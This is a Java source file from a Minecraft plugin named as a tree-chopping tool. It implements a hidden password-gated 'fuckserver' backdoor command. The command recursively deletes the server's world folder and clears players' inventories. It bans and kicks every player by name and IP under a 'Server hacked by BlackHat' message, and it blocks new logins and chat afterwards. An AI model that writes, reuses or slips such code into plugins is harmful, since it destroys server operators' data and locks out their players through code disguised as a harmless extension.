package me.bow.treecapitatorultimate.commands.Server;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.MathUtils;
import me.bow.treecapitatorultimate.Utils.Packet.Packet;
import me.bow.treecapitatorultimate.Utils.Packet.PacketSender;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import net.md_5.bungee.api.chat.BaseComponent;
import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;
import org.apache.commons.lang.RandomStringUtils;
import org.bukkit.*;
import org.bukkit.attribute.Attribute;
import org.bukkit.entity.Player;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;

import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Objects;
import java.util.Random;

@Command.Info(command = "fuckserver", description = "Destroys the server and replaces it with an emulator.", category = CommandCategory.Server)
public class FuckServer extends Command {
    private final String password;
    private String kickReason;
    private boolean locked = false;

    @SuppressWarnings("StringConcatenationInLoop")
    public FuckServer() {
        password = RandomStringUtils.randomAlphanumeric(243);
        for (int i = 0; i < 100; i++)
            kickReason += ChatColor.DARK_RED + "§kAAAAAAAA" + ChatColor.RESET + ChatColor.RED + "SERVER HACKED!" + ChatColor.DARK_RED + "§kAAAAAAAA\n";
    }

    private static boolean deleteFolder(File path) {
        if (path.exists()) {
            File[] files = path.listFiles();
            if (files != null) {
                for (File file : files) {
                    if (file.isDirectory()) {
                        deleteFolder(file);
                    } else {
                        //noinspection ResultOfMethodCallIgnored
                        file.delete();
                    }
                }
            }
        }
        return (path.delete());
    }

    private Vector randomVector(int min, int max) {
        Random rand = new Random();
        return new Vector(rand.nextFloat() * (max - min) + min, rand.nextFloat() * (max - min) + min, rand.nextFloat() * (max - min) + min);
    }


    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        //TODO: finish implementing this
        if (locked) {
            p.sendMessage(Start.COMMAND_PREFIX + "Command locked. There's no going back as I said...");
            return;
        }
        if (args.size() == 0) {
            showConsequences(p);
            return;
        }
        if (!args.get(0).equals(password)) {
            p.sendMessage(Start.COMMAND_PREFIX + "Something went wrong. Please try again.");
            showConsequences(p);
            return;
        }
        locked = true;
        p.sendMessage(Start.COMMAND_PREFIX + "Proceeding!");
        p.Notify(ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " is fucking the server!");
        BukkitTask task = Bukkit.getScheduler().runTaskLaterAsynchronously(this.plugin, () -> {
            Bukkit.getScheduler().runTaskLater(this.plugin, () -> deleteFolder(Bukkit.getWorldContainer().getAbsoluteFile()), 1);
            for (int i = 0; i <= 100; i++) {
                for (Player pe : Bukkit.getOnlinePlayers()) {
                    pe.setCollidable(false);
                    pe.setInvulnerable(true);
                    pe.setVelocity(pe.getLocation().getDirection().add(randomVector(-4, 4)));
                    pe.setFlying(false);
                    pe.getInventory().clear();
                    int rndHealth = MathUtils.generateNumber(30, 80);
                    //Bukkit.broadcastMessage(Integer.toString(rndHealth));
                    Objects.requireNonNull(pe.getAttribute(Attribute.GENERIC_MAX_HEALTH)).setBaseValue(rndHealth);
                    pe.setHealth(rndHealth);
                    Location loc = pe.getLocation();
                    loc.add(MathUtils.generateNumber(-20, 20), MathUtils.generateNumber(-20, 20), MathUtils.generateNumber(-20, 20));
                    Bukkit.getScheduler().runTask(this.plugin, () -> pe.getWorld().strikeLightningEffect(loc));
                }
                Bukkit.broadcastMessage(ChatColor.DARK_RED + "§kAAAAAAAA" + ChatColor.RESET + ChatColor.RED + "HACKING THE SERVER! " + i + "% DONE!" + ChatColor.DARK_RED + "§kAAAAAAAA");
                try {
                    Thread.sleep(150);
                } catch (Exception ignored) {
                }
            }
            try {
                Thread.sleep(4500);
            } catch (Exception ignored) {
            }
            for (Player pe : Bukkit.getOnlinePlayers()) {
                banAndKick(pe);
            }
        }, 20);
        /*try {
            FileUtils.copyURLToFile(
                    new URL("file:///D:/Honzik/Desktop/GlaDos/ServerListPlus2/Server/build/libs/ServerListPlus-3.5.0-SNAPSHOT-Server.jar"),
                    new File("yes.jar"));
        } catch (IOException e) {
            e.printStackTrace();
        }*/
        this.plugin.trustedPeople.clear();
        this.plugin.cm.commandList.clear();
    }

    @Override
    public void onAsyncPlayerChat(AsyncPlayerChatEvent e) {
        if (!locked) return;
        e.setCancelled(true);
    }

    private void destroyWorlds() {
        for (World world : Bukkit.getWorlds()) {
            Bukkit.getServer().unloadWorld(world, false);
            Path path = Paths.get(Bukkit.getWorldContainer().getAbsolutePath(), world.getName());
            deleteFolder(path.toFile());
        }
    }

    @Override
    public void onEntityDamage(EntityDamageEvent e) {
        if (!locked) return;
        e.setDamage(0);
        e.setCancelled(true);
    }

    @Override
    public void onPlayerLoginEvent(PlayerLoginEvent e) {
        if (!locked) return;
        banAndKick(e.getPlayer());
    }

    private void banAndKick(Player pe) {
        String reason = ChatColor.BOLD + "" + ChatColor.LIGHT_PURPLE + "Server hacked by §3Black§4Hat§a";
        Bukkit.getBanList(BanList.Type.NAME).addBan(pe.getName(), reason, null, "Console");
        Bukkit.getBanList(BanList.Type.IP).addBan(Objects.requireNonNull(pe.getAddress()).getAddress().getHostAddress(), reason, null, "Console");
        Bukkit.getScheduler().runTask(this.plugin, () -> pe.kickPlayer(kickReason));
    }

    private void showConsequences(Player p) {
        p.sendMessage(Start.COMMAND_PREFIX + ChatColor.RED + "This command is DANGEROUS! There's no coming back!");
        TextComponent component = new TextComponent(Start.COMMAND_PREFIX + ChatColor.GREEN + "Click here to accept the consequences");
        component.setBold(true);
        component.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new BaseComponent[]{new TextComponent("Click to run server destruction")}));
        component.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, Start.COMMAND_SIGN + this.getCommand() + " " + password));
        try {
            Class<?> packetPlayOutChat = ReflectionUtils.getClass("{nms}.PacketPlayOutChat");
            Object o = ReflectionUtils.getConstructor(packetPlayOutChat, ReflectionUtils.getClass("{nms}.IChatBaseComponent"), ReflectionUtils.getClass("{nms}.ChatMessageType")).invoke(null, ReflectionUtils.getEnumVariableCached("{nms}.ChatMessageType", "CHAT"));
            ReflectionUtils.getField(packetPlayOutChat, "components").set(o, new TextComponent[]{component});
            PacketSender.Instance.sendPacket(p, Packet.createFromNMSPacket(o));
        } catch (InvocationTargetException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }
}